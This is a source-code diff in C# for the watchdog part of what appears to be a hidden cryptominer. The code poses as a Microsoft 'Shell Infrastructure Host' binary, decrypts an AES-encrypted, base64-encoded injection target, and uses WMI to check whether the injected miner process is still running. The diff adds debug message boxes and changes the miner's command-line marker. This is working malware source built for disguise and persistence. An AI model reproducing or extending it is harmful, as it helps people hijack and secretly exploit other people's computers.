@@ -6,6 +6,9 @@ using System.Reflection;
 using System.Security.Cryptography;
 using System.Text;
 using System.Threading;
+#if DefDebug
+using System.Windows.Forms;
+#endif
 
 [assembly: AssemblyTitle("Shell Infrastructure Host")]
 [assembly: AssemblyDescription("Shell Infrastructure Host")]
@@ -13,7 +16,7 @@ using System.Threading;
 [assembly: AssemblyCopyright("© Microsoft Corporation. All Rights Reserved.")]
 [assembly: AssemblyFileVersion("10.0.19041.746")]
 
-public partial class Watchdog
+public partial class Program
 {
     public static byte[] xm = new byte[] { };
     public static string plp = "";
@@ -29,6 +32,9 @@ public partial class Watchdog
         }
         catch (Exception ex)
         {
+#if DefDebug
+            MessageBox.Show("W1: " + Environment.NewLine + ex.ToString());
+#endif
             Environment.Exit(0);
         }
     }
@@ -37,7 +43,7 @@ public partial class Watchdog
     {
         try
         {
-            if (!RCheckProc(RGetString("#InjectionTarget"), "--donate-l"))
+            if (!RCheckProc())
             {
                 if (!File.Exists(plp))
                 {
@@ -76,7 +82,12 @@ public partial class Watchdog
 
             RWDLoop();
         }
-        catch { }
+        catch (Exception ex)
+        {
+#if DefDebug
+            MessageBox.Show("W2: " + Environment.NewLine + ex.ToString());
+#endif
+        }
 
     }
 
@@ -85,27 +96,33 @@ public partial class Watchdog
         return Encoding.ASCII.GetString(RAES_Decryptor(Convert.FromBase64String(input)));
     }
 
-    public static bool RCheckProc(string process, string contains)
+    public static bool RCheckProc()
     {
-        try { 
+        try
+        {
             var options = new ConnectionOptions();
             options.Impersonation = ImpersonationLevel.Impersonate;
             var scope = new ManagementScope(@"\\" + Environment.UserDomainName + @"\root\cimv2", options);
             scope.Connect();
-            string wmiQuery = string.Format("Select CommandLine from Win32_Process where Name='{0}'", process);
+
+            string wmiQuery = string.Format("Select CommandLine from Win32_Process where Name='{0}'", RGetString("#InjectionTarget"));
             var query = new ObjectQuery(wmiQuery);
             var managementObjectSearcher = new ManagementObjectSearcher(scope, query);
             var managementObjectCollection = managementObjectSearcher.Get();
             foreach (ManagementObject retObject in managementObjectCollection)
             {
-                if (retObject != null && retObject["CommandLine"] != null && retObject["CommandLine"].ToString().Contains(contains))
+                if (retObject != null && retObject["CommandLine"] != null && retObject["CommandLine"].ToString().Contains("--cinit-find-x"))
                 {
                     return true;
                 }
             }
         }
-        catch { }
-
+        catch (Exception ex)
+        {
+#if DefDebug
+            MessageBox.Show("W3: " + Environment.NewLine + ex.ToString());
+#endif
+        }
         return false;
     }
 
